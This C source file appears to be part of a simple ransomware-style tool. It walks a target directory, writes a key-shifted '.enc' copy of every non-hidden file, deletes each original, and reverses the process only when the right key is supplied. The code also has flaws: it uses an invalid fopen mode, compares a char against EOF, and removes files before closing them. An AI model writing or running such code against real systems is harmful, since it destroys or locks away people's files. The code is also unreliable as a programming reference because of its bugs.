#include <stdio.h>
#include <malloc.h>
#include <string.h>
#include <unistd.h>
#include "traverse.h"
#include "../path/path.h"
#include "../shared.h"

int is_dec = 0;

int traverser(const char *path, const struct stat *stat, int flag) {
    FILE *file = fopen(path, "rw+");
    if (!is_hidden_file(path) && file) {
        char *f_name = malloc(strlen(path) + 5);
        sprintf(f_name, "%s.%s", path, is_dec ? "dec" : "enc");
        FILE *p_file = fopen(f_name, "w+");
        free(f_name);
        char c;
        while ((c = (char) fgetc(file)) != EOF) {
            fprintf(p_file, "%c", (char) (is_dec ? (c - key) : (c + key)));
        }
        remove(path);
        fclose(p_file);
        fclose(file);
    }
    return 0;
}


/*
 * Traverses into target directory and ignoring hidden files
 * */
int traverse_in(const char *dir, long long d_key, int action) {
    if (action != 0) {
        is_dec = 1;
        sleep(waiting_time); // prevents flooding
    }

    if (key != d_key) {
        fprintf(stderr, "Invalid Key %lld\n", d_key);
        return 0;
    }
    ftw(dir, traverser, FTW_D);
    return 1;
}
